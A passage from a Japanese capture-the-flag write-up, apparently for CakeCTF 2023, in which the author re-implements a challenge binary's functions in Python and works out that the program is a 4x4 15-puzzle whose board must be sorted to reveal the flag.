        <span class=n>M</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>M_bytes</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>4</span><span class=p>],</span> <span class=s2>&#34;little&#34;</span><span class=p>)</span>
    <span class=k>else</span><span class=p>:</span>
        <span class=n>M</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span>

<span class=k>def</span> <span class=nf>s</span><span class=p>():</span>
    <span class=n>p1</span> <span class=o>=</span> <span class=mi>0</span>
    <span class=n>p2</span> <span class=o>=</span> <span class=mi>0</span>
    <span class=k>for</span> <span class=n>local_c</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
        <span class=k>for</span> <span class=n>local_10</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
            <span class=k>if</span> <span class=n>M</span><span class=p>[(</span><span class=n>local_c</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>local_10</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
                <span class=n>p1</span> <span class=o>=</span> <span class=n>local_c</span>
                <span class=n>p2</span> <span class=o>=</span> <span class=n>local_10</span>
    <span class=k>return</span> <span class=p>(</span><span class=n>p1</span><span class=p>,</span> <span class=n>p2</span><span class=p>)</span>

<span class=k>def</span> <span class=nf>s_index</span><span class=p>():</span>
    <span class=k>for</span> <span class=n>local_c</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
        <span class=k>for</span> <span class=n>local_10</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[</span><span class=si>{}</span><span class=s2>, </span><span class=si>{}</span><span class=s2>] </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>local_c</span><span class=p>,</span> <span class=n>local_10</span><span class=p>,</span> <span class=p>(</span><span class=n>local_c</span> <span class=o>*</span> <span class=mi>4</span> <span class=o>+</span> <span class=n>local_10</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>))</span>

<span class=k>def</span> <span class=nf>e</span><span class=p>(</span><span class=n>p1</span><span class=p>):</span>
    <span class=n>s1</span><span class=p>,</span> <span class=n>s2</span> <span class=o>=</span> <span class=n>s</span><span class=p>()</span> <span class=c1># s1, s2 is (0~3)</span>
    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[</span><span class=si>{}</span><span class=s2>, </span><span class=si>{}</span><span class=s2>, </span><span class=si>{}</span><span class=s2>]&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>s1</span><span class=p>,</span> <span class=n>s2</span><span class=p>,</span> <span class=n>p1</span><span class=p>))</span>
    <span class=k>if</span> <span class=n>p1</span> <span class=o>==</span> <span class=s2>&#34;U&#34;</span><span class=p>:</span>
        <span class=k>if</span> <span class=n>s1</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&lt;Move&gt;U: </span><span class=si>{}</span><span class=s2>, </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>((</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span> <span class=p>((</span><span class=n>s1</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>))</span>
            <span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>],</span><span class=n>M</span><span class=p>[((</span><span class=n>s1</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=n>M</span><span class=p>[((</span><span class=n>s1</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>],</span><span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>]</span>
    <span class=k>elif</span> <span class=n>p1</span> <span class=o>&lt;</span> <span class=s2>&#34;V&#34;</span><span class=p>:</span>
        <span class=k>if</span> <span class=n>p1</span> <span class=o>==</span> <span class=s2>&#34;R&#34;</span><span class=p>:</span>
            <span class=k>if</span> <span class=n>s2</span> <span class=o>!=</span> <span class=mi>3</span><span class=p>:</span>
                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&lt;Move&gt;R: </span><span class=si>{}</span><span class=s2>, </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>((</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span> <span class=p>(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=p>(</span><span class=n>s2</span><span class=o>+</span><span class=mi>1</span><span class=p>))</span><span class=o>*</span><span class=mi>4</span><span class=p>))</span>
                <span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>],</span><span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=p>(</span><span class=n>s2</span><span class=o>+</span><span class=mi>1</span><span class=p>))</span><span class=o>*</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=p>(</span><span class=n>s2</span><span class=o>+</span><span class=mi>1</span><span class=p>))</span><span class=o>*</span><span class=mi>4</span><span class=p>],</span><span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>]</span>
        <span class=k>elif</span> <span class=n>p1</span> <span class=o>&lt;</span> <span class=s2>&#34;S&#34;</span><span class=p>:</span>
            <span class=k>if</span> <span class=n>p1</span> <span class=o>==</span> <span class=s2>&#34;D&#34;</span><span class=p>:</span>
                <span class=k>if</span> <span class=n>s1</span> <span class=o>!=</span> <span class=mi>3</span><span class=p>:</span>
                    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&lt;Move&gt;D: </span><span class=si>{}</span><span class=s2>, </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>((</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span> <span class=p>((</span><span class=n>s1</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>))</span>
                    <span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>],</span><span class=n>M</span><span class=p>[((</span><span class=n>s1</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=n>M</span><span class=p>[((</span><span class=n>s1</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>],</span><span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>]</span>
            <span class=k>elif</span> <span class=n>p1</span> <span class=o>==</span> <span class=s2>&#34;L&#34;</span> <span class=ow>and</span> <span class=n>s2</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&lt;Move&gt;L: </span><span class=si>{}</span><span class=s2>, </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>((</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span> <span class=p>(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=p>(</span><span class=n>s2</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span><span class=o>*</span><span class=mi>4</span><span class=p>))</span>
                <span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>],</span><span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=p>(</span><span class=n>s2</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span><span class=o>*</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=p>(</span><span class=n>s2</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span><span class=o>*</span><span class=mi>4</span><span class=p>],</span><span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>]</span>

<span class=k>def</span> <span class=nf>e_index</span><span class=p>():</span>
    <span class=k>for</span> <span class=n>s1</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
        <span class=k>for</span> <span class=n>s2</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[</span><span class=si>{}</span><span class=s2>, </span><span class=si>{}</span><span class=s2>]&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>s1</span><span class=p>,</span> <span class=n>s2</span><span class=p>))</span>
            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;U: </span><span class=si>{}</span><span class=s2>, </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>((</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span> <span class=p>((</span><span class=n>s1</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>))</span>
            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;R: </span><span class=si>{}</span><span class=s2>, </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>((</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span> <span class=p>(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=p>(</span><span class=n>s2</span><span class=o>+</span><span class=mi>1</span><span class=p>))</span><span class=o>*</span><span class=mi>4</span><span class=p>))</span>
            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;D: </span><span class=si>{}</span><span class=s2>, </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>((</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span> <span class=p>((</span><span class=n>s1</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>))</span>
            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;L: </span><span class=si>{}</span><span class=s2>, </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>((</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span> <span class=p>(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=p>(</span><span class=n>s2</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span><span class=o>*</span><span class=mi>4</span><span class=p>))</span>

    
<span class=k>def</span> <span class=nf>q</span><span class=p>():</span>
    <span class=n>s1</span> <span class=o>=</span> <span class=mi>0</span>
    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
        <span class=k>if</span> <span class=mi>2</span> <span class=o>&lt;</span> <span class=n>s1</span><span class=p>:</span>
            <span class=k>return</span> <span class=mi>0</span>
        <span class=k>for</span> <span class=n>s2</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>3</span><span class=p>):</span>
            <span class=k>if</span> <span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=p>(</span><span class=n>s2</span><span class=o>+</span><span class=mi>1</span><span class=p>))</span><span class=o>*</span><span class=mi>4</span><span class=p>]</span> <span class=o>&lt;=</span> <span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>]:</span>
                <span class=nb>print</span><span class=p>(</span><span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=p>(</span><span class=n>s2</span><span class=o>+</span><span class=mi>1</span><span class=p>))</span><span class=o>*</span><span class=mi>4</span><span class=p>],</span> <span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>])</span>
                <span class=k>return</span> <span class=mi>1</span>
            <span class=k>if</span> <span class=n>M</span><span class=p>[((</span><span class=n>s1</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>]</span> <span class=o>&lt;=</span> <span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>]:</span>
                <span class=nb>print</span><span class=p>(</span><span class=n>M</span><span class=p>[((</span><span class=n>s1</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>],</span> <span class=n>M</span><span class=p>[(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>])</span>
                <span class=k>return</span> <span class=mi>1</span>
        <span class=n>s1</span> <span class=o>+=</span> <span class=mi>1</span>

<span class=k>def</span> <span class=nf>q_index</span><span class=p>():</span>
    <span class=n>s1</span> <span class=o>=</span> <span class=mi>0</span>
    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
        <span class=k>if</span> <span class=mi>2</span> <span class=o>&lt;</span> <span class=n>s1</span><span class=p>:</span>
            <span class=k>return</span> <span class=mi>0</span>
        <span class=k>for</span> <span class=n>s2</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>3</span><span class=p>):</span>
            <span class=nb>print</span><span class=p>((</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=p>(</span><span class=n>s2</span><span class=o>+</span><span class=mi>1</span><span class=p>))</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span> <span class=p>(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>)</span>
            <span class=nb>print</span><span class=p>(((</span><span class=n>s1</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>,</span> <span class=p>(</span><span class=n>s1</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>s2</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=p>)</span>
        <span class=n>s1</span> <span class=o>+=</span> <span class=mi>1</span>

<span class=k>def</span> <span class=nf>f</span><span class=p>(</span><span class=n>i1</span><span class=p>,</span> <span class=n>i2</span><span class=p>):</span> <span class=c1># exchange i1, i2 -&gt; i2, i1</span>
    <span class=n>i1</span> <span class=o>=</span> <span class=n>i1</span> <span class=o>^</span> <span class=n>i2</span>
    <span class=n>i2</span> <span class=o>=</span> <span class=n>i2</span> <span class=o>^</span> <span class=n>i1</span>
    <span class=n>i1</span> <span class=o>=</span> <span class=n>i1</span> <span class=o>^</span> <span class=n>i2</span>
    <span class=k>return</span> <span class=p>(</span><span class=n>i1</span><span class=p>,</span> <span class=n>i2</span><span class=p>)</span>

</code></pre></td></tr></table>
</div>
</div><p>まず、<code>q</code>関数でどこのインデックスで比較しているかを<code>q_index</code>メソッドを実行して確認します。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>[0]
&lt;s1=0, s2=0&gt;
M[4] &gt;= M[0]
M[16] &gt;= M[0]
&lt;s1=0, s2=1&gt;
M[8] &gt;= M[4]
M[20] &gt;= M[4]
&lt;s1=0, s2=2&gt;
M[12] &gt;= M[8]
M[24] &gt;= M[8]

[1]
&lt;s1=1, s2=0&gt;
M[20] &gt;= M[16]
M[32] &gt;= M[16]
&lt;s1=1, s2=1&gt;
M[24] &gt;= M[20]
M[36] &gt;= M[20]
&lt;s1=1, s2=2&gt;
M[28] &gt;= M[24]
M[40] &gt;= M[24]

[2]
&lt;s1=2, s2=0&gt;
M[36] &gt;= M[32]
M[48] &gt;= M[32]
&lt;s1=2, s2=1&gt;
M[40] &gt;= M[36]
M[52] &gt;= M[36]
&lt;s1=2, s2=2&gt;
M[44] &gt;= M[40]
M[56] &gt;= M[40]
</code></pre></td></tr></table>
</div>
</div><p>これだけだとよくわからないので、ハッセ図でまとめます。
<img src=https://hiro-1219.github.io/blog/p/cakectf2023-writeup/img/puzzle_hasse.jpg width=1941 height=1957 srcset="https://hiro-1219.github.io/blog/p/cakectf2023-writeup/img/puzzle_hasse_hud13026777a0573e19b13b46596cef46c_285862_480x0_resize_q75_box.jpg 480w, https://hiro-1219.github.io/blog/p/cakectf2023-writeup/img/puzzle_hasse_hud13026777a0573e19b13b46596cef46c_285862_1024x0_resize_q75_box.jpg 1024w" loading=lazy alt="q関数 ハッセ図" class=gallery-image data-flex-grow=99 data-flex-basis=238px>
とてもきれいなパターンが出てきました。このハッセ図から0から56まで昇順でソートすれば<code>q</code>関数は0を返してくれることが分かります。</p>
<p>次に、<code>e</code>関数ではどのようなインデックスで交換を行っているか<code>e_index</code>メソッドを実行して確認します。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>[0, 0]
U: 0, -16
R: 0, 4
D: 0, 16
L: 0, -4
[0, 1]
U: 4, -12
R: 4, 8
D: 4, 20
L: 4, 0
[0, 2]
U: 8, -8
R: 8, 12
D: 8, 24
L: 8, 4
[0, 3]
U: 12, -4
R: 12, 16
D: 12, 28
L: 12, 8
[1, 0]
U: 16, 0
R: 16, 20
D: 16, 32
L: 16, 12
[1, 1]
U: 20, 4
R: 20, 24
D: 20, 36
L: 20, 16
[1, 2]
U: 24, 8
R: 24, 28
D: 24, 40
L: 24, 20
[1, 3]
U: 28, 12
R: 28, 32
D: 28, 44
L: 28, 24
[2, 0]
U: 32, 16
R: 32, 36
D: 32, 48
L: 32, 28
[2, 1]
U: 36, 20
R: 36, 40
D: 36, 52
L: 36, 32
[2, 2]
U: 40, 24
R: 40, 44
D: 40, 56
L: 40, 36
[2, 3]
U: 44, 28
R: 44, 48
D: 44, 60
L: 44, 40
[3, 0]
U: 48, 32
R: 48, 52
D: 48, 64
L: 48, 44
[3, 1]
U: 52, 36
R: 52, 56
D: 52, 68
L: 52, 48
[3, 2]
U: 56, 40
R: 56, 60
D: 56, 72
L: 56, 52
[3, 3]
U: 60, 44
R: 60, 64
D: 60, 76
L: 60, 56
</code></pre></td></tr></table>
</div>
</div><p>インデックスを表しているのに負の数を返しているものや範囲外のインデックスになるものがありますが、<code>e</code>関数の条件でこれらは弾かれることが分かります。<code>s</code>関数は<code>M</code>関数の0の位置を2次元のインデックスとして返しているようです。</p>
<p>以上の数値を見てみるとわかることは、全てのインデックスにおいて、Uを入力すると$4\times4$だけ値が減っている、Rを入力すると$1\times4$だけ値が増えている、Dを入力すると$4\times4$だけ値が増えている、Lを入力すると$1\times4$だけ値が減っていることです。</p>
<p>これらのことから、このプログラムは$4\times4$で構成される15パズルを表していることが分かります。具体的には、次のようなパズルがあり、0を移動させて、左上から値を昇順に並べることで、flagを得られるようなプログラムになっていることが分かります。<code>M</code>はこのパズルの盤面だったようです。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>1146640091 1277362948 0002245791 1729795767 
1817593079 2146722439 1860814889 1557802610 
0000000000 1770948809 0870734415 1355570260 
0323584794 1405652852 0629508793 1928951512 
</code></pre></td></tr></table>
</div>
</div><p>これだと値が大きすぎて盤面の状態がよく分からないので、0から15までの値で以上の15パズルを表してみます。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>05 06 01 10 
12 15 13 09 
00 11 04 07 
02 08 03 14
</code></pre></td></tr></table>
</div>
</div><p>これを左上から0から15で並べ替えていきます。多分効率のいいアルゴリズムはあると思いますが、プログラム書くより解いた方が速いと思い、人力で解きました。（結局、とても時間かかりました）</p>
<p>パズルを解きやすくすため、以下のコードを追加して、パズルを解いていきます。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=k>def</span> <span class=nf>puzzle_index</span><span class=p>():</span>
    <span class=n>index</span> <span class=o>=</span> <span class=p>[</span><span class=n>x</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>)]</span>
    <span class=n>puzzle</span> <span class=o>=</span> <span class=p>[]</span>
    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=o>*</span><span class=mi>4</span><span class=p>):</span>
        <span class=k>if</span> <span class=n>i</span> <span class=o>%</span> <span class=mi>4</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
            <span class=n>puzzle</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>M</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
    <span class=n>sorted_puzzle</span><span class=p>,</span> <span class=n>sorted_index</span> <span class=o>=</span> <span class=nb>zip</span><span class=p>(</span><span class=o>*</span><span class=nb>sorted</span><span class=p>(</span><span class=nb>zip</span><span class=p>(</span><span class=n>puzzle</span><span class=p>,</span> <span class=n>index</span><span class=p>),</span> <span class=n>reverse</span><span class=o>=</span><span class=kc>True</span><span class=p>))</span>
    <span class=k>return</span> <span class=n>sorted_index</span><span class=p>,</span> <span class=n>sorted_puzzle</span>

<span class=k>def</span> <span class=nf>state_puzzle</span><span class=p>(</span><span class=n>sorted_index</span><span class=p>):</span>
